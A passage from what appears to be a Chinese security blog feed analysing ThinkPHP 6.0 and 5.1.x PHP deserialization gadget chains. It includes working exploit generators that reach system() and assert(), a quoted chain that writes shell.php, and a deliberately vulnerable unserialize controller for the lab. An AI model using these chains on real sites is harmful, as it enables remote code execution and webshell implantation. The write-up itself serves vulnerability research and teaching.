loading="lazy"></p><p>这里需要执行到getAttr方法，需要满足其中一个$data的key和$this-&gt;visible的key相同，既可以触发getAttr方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getAttr</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// key = name</span><span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$value</span>    <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// whoami</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvalidArgumentException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isRelationAttr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$value</span>    <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// fanxing  whoami</span><span class="token punctuation">}</span></code></pre><p>跟进getData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/7.png" alt="" loading="lazy"></p><p>这里$fieldName的键要存在于$this-&gt;data数组中，而$fieldName时通过getRealFieldName获取的</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getRealFieldName</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">strict</span> <span class="token operator">?</span> <span class="token variable">$name</span> <span class="token punctuation">:</span> Str<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">snake</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>满足$this-&gt;strict为true就返回传递进来的值。最后又回到getAttr方法中</p><pre class=" language-php"><code class="language-php"><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>经过上面的分析，这里满足$name和$value可控，跟进getValue方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/8.png" alt="" loading="lazy"></p><p>漏洞触发点在圈起的地方，这里value可控，只需要满足$closure可控就可以rce，看上行代码，$this-&gt;withAttr是可控的，$fieldName是经过getRealFieldName方法获得的，也是可控的，最后，整个pop链就分析完了。</p><h4 id="pop链流程"><a href="#pop链流程" class="headerlink" title="pop链流程"></a><strong>pop链流程</strong></h4><p>这里利用下<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md" target="_blank" rel="noopener">Mochazz</a>的pop链分析图片</p><p><img src="https://raw.githubusercontent.com/Mochazz/ThinkPHP-Vuln/master/ThinkPHP6/ThinkPHP6.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/4.png" alt="" loading="lazy"></p><h4 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a><strong>EXP编写</strong></h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span><span class="token keyword">trait</span> <span class="token class-name">Conversion</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">trait</span> <span class="token class-name">Attribute</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Attribute</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Conversion</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$lazySave</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$exists</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$field</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$schema</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$visible</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">visible</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'111'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/9.png" alt="" loading="lazy"></p><p>tp6.0反序列还有其他链，复制下<a href="http://hed9eh0g.top/?p=217" target="_blank" rel="noopener">Hed9eh0g</a>这条链写入文件的poc</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$autosave</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>AbstractCache</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Adapter</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapter</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">"shell.php"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">adapter</span> <span class="token operator">=</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Local</span>     <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$writeFlags</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//对应file_put_contents的第三个参数</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token variable">$local</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>Local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">(</span><span class="token variable">$local</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X反序列化利用链.md" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X反序列化利用链.md</a></p><p>2.<a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2反序列化/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2反序列化/</a></p><p>3.<a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x反序列化/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x反序列化/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;&lt;strong&gt;环境搭建&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;安装tp6.0&lt;/p&gt;
&lt;pre class=&quot; language-shell&quot;&gt;&lt;cod
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.1.x反序列化链分析</title>
    <link href="http://yoursite.com/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-09T09:44:33.456Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h4><p>利用composer下载tp5.1.37的环境</p><pre class=" language-shell"><code class="language-shell">composer create-project --prefer-dist topthink/think thinkphp5.1.37cd thinkphp5.1.37修改composer.json文件里的为：topthink/framework": "5.1.37保存退出执行：composer update</code></pre><p>要进行反序列化攻击，需要可控的unserialize，在index控制器中写入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>    </code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p>这条链的前面部分跟tp5.0.24那条链一样，先全局查找__destruct魔术方法，找到文件<code>/thinkphp/library/think/process/pipes/Windows.php</code></p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进removeFiles方法，file_exists函数执行会把里里面的参数当做字符串，所以可以调用__toString魔术方法。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里，全局查找__toString，这里存在两条链，我们利用<code>\thinkphp\library\think\model\concern\Conversion.php</code>这条链来构造，这里要怎么调用到__toString方法，而Conversion类是trait关键字声明的，无法被实例化。在类中，可以使用use关键字来继承这个Conversion类，全局查找Conversion类，发现<code>\thinkphp\library\think\Model.php</code></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/1.png" alt="" loading="lazy"></p><p>抽象类不能被实例化，需要找他的子类，发现<code>\thinkphp\library\think\model\Pivot.php</code>，所以payload为：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre><p>继续跟进__toString魔术方法中toJson-&gt;toArray()方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/2.png" alt="" loading="lazy"></p><p>当$relation可控的时候可以触发__call方法，这里，$this-&gt;append可控就代表key和name可控，跟进getRelation方法看一下</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/3.png" alt="" loading="lazy"></p><p>当条件语句都不满足无任何返回，就继续跟进getAttr方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/4.png" alt="" loading="lazy"></p><p>这里始终都会执行getData，跟进这个函数</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/5.png" alt="" loading="lazy"></p><p>$this-&gt;data可控，就代表$relation变量可控，所以就可以触发__call方法，全局查找一下。这里可以利用tprce那个那个类来触发命令执行。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/6.png" alt="" loading="lazy"></p><p>这里$this-&gt;hook[$method]是可控，而array_unshift函数会在$args数组前插入新元素，所以导致$args不可控，分析过tp5rce的都知道filterValue方法存在call_user_func可以构造rce。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/7.png" alt="" loading="lazy"></p><p>这里，怎么执行到filterValue，该类的input方法可以调用，但是input方法的参数不可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/8.png" alt="" loading="lazy"></p><p>需要查找哪里调用input方法了，发现param调用了input</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/9.png" alt="" loading="lazy"></p><p>这里$this-&gt;param可控，而name不可控，又需要查找哪里调用param方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isAjax</span><span class="token punctuation">(</span><span class="token variable">$ajax</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$value</span>  <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">server</span><span class="token punctuation">(</span><span class="token string">'HTTP_X_REQUESTED_WITH'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string">'xmlhttprequest'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token operator">===</span> <span class="token variable">$ajax</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$result</span>           <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'var_ajax'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mergeParam</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>找到isAjax方法，$this-&gt;config可控，就代表param方法中的name参数可控，就代表input方法中data，name参数都可控，继续回到input方法查看第1373行，在filterValue方法$filters参数要可控</p><pre class=" language-php"><code class="language-php"><span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>跟进getFilter方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/10.png" alt="" loading="lazy"></p><p>$this-&gt;filter可控就代表了filterValue方法$filters参数可控，所以组合起来，poc如下</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token string">"123456"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Request</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$param</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$hook</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"assert"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"var_ajax"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"visible"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"phpinfo()"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/11.png" alt="" 